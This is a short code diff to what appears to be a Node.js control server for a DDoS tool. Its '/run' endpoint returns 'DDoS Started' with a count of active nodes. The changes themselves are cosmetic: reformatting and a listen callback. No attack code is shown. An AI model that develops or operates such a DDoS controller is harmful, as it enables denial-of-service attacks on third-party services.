@@ -56,7 +56,7 @@ server.listen(config.port);
 
 
 /**
- *  
+ *
  */
 var app = connect();
 
@@ -72,7 +72,13 @@ app.use('/run', function (req, res, next) {
     });
 
     res.setHeader('Content-Type', 'application/json');
-    res.end(JSON.stringify({ activeNodes: activeNodes.length, result: 'ok', message: 'DDoS Started' }));
+    res.end(
+      JSON.stringify({
+        activeNodes: activeNodes.length,
+        result: 'ok',
+        message: 'DDoS Started'
+      })
+    );
 
     next();
 });
@@ -100,5 +106,6 @@ app.use('/stats', function (req, res, next) {
 /**
  * Start the Web Server
  */
-http.createServer(app).listen(3000)
-
+http.createServer(app).listen(3000, function() {
+  console.log('listening on port 3000...');
+});
